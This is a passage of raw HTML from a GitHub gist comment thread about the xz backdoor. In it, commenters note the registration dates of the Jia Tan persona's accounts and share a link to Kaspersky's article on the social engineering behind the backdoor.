      <p dir="auto">OK, gone through comments, please let me know if I missed any changes either from here in the last few days or generally on the internet. Thanks!</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5027809" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="LoVWyfVd2wnMpRGcx9ZLKinDdUUXbvJUvHpXDLEC_IGhSXsv3fBOXM7CRZyQPgusrVCH_OBVQHnujyDr_xJL9w" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5027809/edit_form?textarea_id=gistcomment-5027809-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/roccotanica1234/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/roccotanica1234"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/166399139?s=80&amp;v=4" width="40" height="40" alt="@roccotanica1234" /></a>
    </div>
    <div id="gistcomment-5028044" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5028044-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/roccotanica1234/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/roccotanica1234">roccotanica1234</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5028044#gistcomment-5028044" id="gistcomment-5028044-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-18T09:42:57Z" class="no-wrap">Apr 18, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">Jia Tan's account, associated to <a href="mailto:jiat0218@gmail.com">jiat0218@gmail.com</a> on Twitter is: <a href="https://twitter.com/JiaT03868010" rel="nofollow">https://twitter.com/JiaT03868010</a> (I haven't find it mentioned anywhere)</p>
</blockquote>
<p dir="auto">I just noticed that Jia Tan's Twitter registration date (Dec 2020) is earlier than Github registration date. (26 Jan 21)</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/166399139/323549241-92bc97dd-f341-4e45-91eb-d9a0feb9bf8e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii8xNjYzOTkxMzkvMzIzNTQ5MjQxLTkyYmM5N2RkLWYzNDEtNGU0NS05MWViLWQ5YTBmZWI5YmY4ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMzQwMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lYmZiZDJjZDZkNDUxZmFmMzc2NDc1MDg5YTU2ZmIyMjY2MWQwZDExN2IxN2IwNjJjN2EzMDRmZjFlZjgxYzA0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.L0lHFC6C40PvrPnkG3pHMDli_BtiM8bur5umpkc9YEI"><img src="https://private-user-images.githubusercontent.com/166399139/323549241-92bc97dd-f341-4e45-91eb-d9a0feb9bf8e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii8xNjYzOTkxMzkvMzIzNTQ5MjQxLTkyYmM5N2RkLWYzNDEtNGU0NS05MWViLWQ5YTBmZWI5YmY4ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwMzQwMTRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1lYmZiZDJjZDZkNDUxZmFmMzc2NDc1MDg5YTU2ZmIyMjY2MWQwZDExN2IxN2IwNjJjN2EzMDRmZjFlZjgxYzA0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.L0lHFC6C40PvrPnkG3pHMDli_BtiM8bur5umpkc9YEI" alt="image" style="max-width: 100%;"></a></p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5028044" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="0G2KooMN86cGagcVRiEvT48M9cNiMYLwF6NAzRRvgxK6GzD0YbkHLJOnwdF2N6MwJ9_J3Mqcc4WeLttR0AUNkg" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5028044/edit_form?textarea_id=gistcomment-5028044-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/pillowtrucker/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pillowtrucker"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/131599858?s=80&amp;v=4" width="40" height="40" alt="@pillowtrucker" /></a>
    </div>
    <div id="gistcomment-5032521" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5032521-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/pillowtrucker/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/pillowtrucker">pillowtrucker</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5032521#gistcomment-5032521" id="gistcomment-5032521-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-22T18:06:22Z" class="no-wrap">Apr 22, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">did we gett'em yet</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5032521" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="SfAe8CDdwg9CT8wmFZYeEmwIKBhDYLd6VuPkEzbpBUKqckG38URMMwF6kclK5_47Kpn9SRj2NQsiPr7YGgLGfw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5032521/edit_form?textarea_id=gistcomment-5032521-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/calestyo/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/calestyo"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/919933?s=80&amp;v=4" width="40" height="40" alt="@calestyo" /></a>
    </div>
    <div id="gistcomment-5034738" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5034738-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/calestyo/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/calestyo">calestyo</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5034738#gistcomment-5034738" id="gistcomment-5034738-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-24T14:45:38Z" class="no-wrap">Apr 24, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/thesamesam">@thesamesam</a> Kaspersky part 2 on the XZ door is out <a href="https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/" rel="nofollow">https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/</a></p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5034738" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="hHFKEUuM-6za19nCWM8TEWQqWQXqh7Sx3n2JaERsEBJILCgfbRSzhzxi6BFFVKvIQy0baSflmwdZDOo6gg6I_g" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5034738/edit_form?textarea_id=gistcomment-5034738-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/11667869?s=80&amp;v=4" width="40" height="40" alt="@thesamesam" /></a>
    </div>
    <div id="gistcomment-5036325" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5036325-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      
<span aria-label="This user is the author of this ." data-view-component="true" class="tooltipped tooltipped-n">
  <span data-view-component="true" class="Label ml-1">Author</span>
</span>

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/thesamesam">thesamesam</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5036325#gistcomment-5036325" id="gistcomment-5036325-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-25T23:44:49Z" class="no-wrap">Apr 25, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/calestyo/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/calestyo">@calestyo</a> Thanks!</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5036325" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="SJUT70ZH7a9a6nfU6G3XxZUN0K87Hv33wY_SnGw3-aQef3taeCKri2ZshUoEu975cHn3BQnfWRj4dCbtN75Fgw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5036325/edit_form?textarea_id=gistcomment-5036325-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/michaelblyons/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/michaelblyons"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/2701605?s=80&amp;v=4" width="40" height="40" alt="@michaelblyons" /></a>
    </div>
    <div id="gistcomment-5042901" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5042901-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/michaelblyons/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/michaelblyons">michaelblyons</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5042901#gistcomment-5042901" id="gistcomment-5042901-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-05-01T14:44:47Z" class="no-wrap">May 1, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOACk5JdoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBM8tU"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
